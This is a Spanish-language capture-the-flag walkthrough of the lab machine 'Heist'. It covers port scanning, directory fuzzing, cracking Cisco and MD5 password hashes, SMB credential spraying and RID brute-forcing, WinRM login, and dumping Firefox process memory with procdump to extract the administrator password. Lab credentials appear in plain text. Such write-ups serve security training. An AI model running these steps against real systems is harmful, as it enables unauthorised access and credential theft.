---
description: '✍️ Autor: MinatoTW🔍 Dificultad: Fácil 📅 Fecha de creación: 20/11/2019'
---

# Heist

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 10.10.10.149
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (1284).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sC -sV 10.10.10.149
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1285).png" alt=""><figcaption></figcaption></figure>

Durante el escaneo se identificaron los siguientes puertos abiertos:

* **Puerto 80 (HTTP):** El puerto 80 está abierto y ejecutando un servidor web **Microsoft IIS 10.0**. Además, la página detectada es **"Support Login Page"** y el recurso solicitado es `login.php`.
* **Puerto 135 (MSRPC):** El puerto **135 (RPC)** está abierto, lo cual indica que el sistema Windows puede estar ejecutando servicios de administración remota.
* **Puerto 445 (SMB):** El puerto 445 está abierto, lo que indica que **SMB (Server Message Block)** está en uso. Esto puede abrir múltiples vectores de ataque.

A continuación, se procederá a analizar cada uno de estos servicios en busca de posibles vectores de ataque.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p80,135,445 -v 10.10.10.149
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (1286).png" alt=""><figcaption></figcaption></figure>

Revisamos el puerto 80.

<figure><img src="../../.gitbook/assets/image (1287).png" alt=""><figcaption></figcaption></figure>

Le damos a iniciar como invitado.

<figure><img src="../../.gitbook/assets/image (1288).png" alt=""><figcaption></figcaption></figure>

Vemos que hay dos usuarios llamados **Hazard** y **Admin**. Hazard tiene un problema con el router de CISCO. Hacemos una búsqueda de directorios.

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.10.10.149/FUZZ
```

<figure><img src="../../.gitbook/assets/image (1289).png" alt=""><figcaption></figcaption></figure>

Me llama la atención el directorio **attachments**.

<figure><img src="../../.gitbook/assets/image (1290).png" alt=""><figcaption></figcaption></figure>

Nos da error ya que no tenemos permisos por lo que enumeramos los archivos que contiene ese directorio.

```bash
gobuster dir -u http://10.10.10.149/attachments/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,pdf,jpg,png,zip,docx,csv
```

<figure><img src="../../.gitbook/assets/image (1302).png" alt=""><figcaption></figcaption></figure>

Nos llama la atención el fichero `config.txt`.

<figure><img src="../../.gitbook/assets/image (1291).png" alt=""><figcaption></figcaption></figure>

Vemos unas contraseñas de Cisco por lo que las crackeamos.

{% embed url="https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html" %}

<figure><img src="../../.gitbook/assets/image (1292).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1293).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

```bash
echo '$1$pdQG$o8nrSzsGXeaduXrjlvKc91' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

<figure><img src="../../.gitbook/assets/image (1294).png" alt=""><figcaption></figcaption></figure>

Con **crackmapexec** miramos las credenicales posibles con Hazard y esas contraseñas.

```
crackmapexec smb 10.10.10.149 -u Hazard -p contraseñas.txt
```

<figure><img src="../../.gitbook/assets/image (1295).png" alt=""><figcaption></figcaption></figure>

El **RID Bruteforce** es una técnica para enumerar usuarios de un sistema Windows explotando cómo funciona el protocolo SMB por lo que eso hacemos.

```
crackmapexec smb 10.10.10.149 -u Hazard -p stealth1agent --rid-brute
```

<figure><img src="../../.gitbook/assets/image (1296).png" alt=""><figcaption></figcaption></figure>

Han aparecido mas usuarios por lo que descubrimos si tenemos sus contraseñas.

```
crackmapexec smb 10.10.10.149 -u usuarios.txt -p contraseñas.txt
```

<figure><img src="../../.gitbook/assets/image (1297).png" alt=""><figcaption></figcaption></figure>

Hemos encontrado las credenciales de **Chase**. Nos logueamos para tener acceso a **WINRM**.

```
evil-winrm -i 10.10.10.149 -u Chase -p "Q4)sJu\Y8qz*A3?d"
```

<figure><img src="../../.gitbook/assets/image (1298).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

<figure><img src="../../.gitbook/assets/image (1299).png" alt=""><figcaption></figcaption></figure>

El primer punto menciona “Seguir revisando la lista de incidencias”. Esto se puede hacer a través de un navegador. Si recordamos, las incidencias eran la sección donde el usuario "Hazard" tenía problemas con su router Cisco y donde pudimos acceder a su archivo de configuración en los adjuntos. Esto sugiere que quien escribió esta nota monitorea activamente las incidencias en el servidor web.

Además, hemos notado que **Firefox** está instalado en la máquina, a pesar de no ser el navegador predeterminado.

<figure><img src="../../.gitbook/assets/image (1300).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1301).png" alt=""><figcaption></figcaption></figure>

Subimos esto.

{% embed url="https://www.techspot.com/downloads/6550-microsoft-procdump.html" %}

<figure><img src="../../.gitbook/assets/image (1303).png" alt=""><figcaption></figcaption></figure>

**Generar el volcado de memoria**: Lo primero que hago es obtener el volcado de memoria de un proceso, como Firefox, utilizando la herramienta _procdump_. Para ello, ejecuto el siguiente comando en PowerShell, sustituyendo `<PID>` por el ID del proceso que quiero volcar.

```
.\procdump64.exe -ma 6624 -accepteula firefox.dmp
```

<figure><img src="../../.gitbook/assets/image (1304).png" alt=""><figcaption></figcaption></figure>

**Buscar las credenciales**: Una vez que tengo el volcado de memoria, procedo a buscar la contraseña o los hashes de las credenciales dentro del archivo `.dmp`. En este caso, encontré la contraseña del administrador: `4dD!5}x/re8]FBuZ`.

```bash
download firefox.dmp
strings firefox.dmp | grep -ie "login_username\|login_password"
```

<figure><img src="../../.gitbook/assets/image (1305).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1306).png" alt=""><figcaption></figcaption></figure>

Conseguimos las credenciales de **administrator** de SMB.

```bash
smbclient //10.10.10.149/C$ -U administrator
```

<figure><img src="../../.gitbook/assets/image (1307).png" alt=""><figcaption></figcaption></figure>

Ya somos **root**.

<figure><img src="../../.gitbook/assets/image (1308).png" alt=""><figcaption></figcaption></figure>
